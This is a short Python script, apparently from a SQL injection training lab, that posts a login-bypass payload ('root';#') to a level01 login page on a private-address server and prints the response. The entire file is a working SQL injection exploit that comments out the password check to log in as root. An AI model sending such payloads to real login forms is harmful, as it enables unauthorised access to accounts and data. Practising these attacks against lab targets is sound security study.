import requests

s = requests.Session()

# Redo ../sqli/level01.sh with python requests.
r = s.post("http://10.0.23.24:8004/level01/index.php", data={"user":"root';#", "pass":"a"})

# Print HTML response.
print(r.text)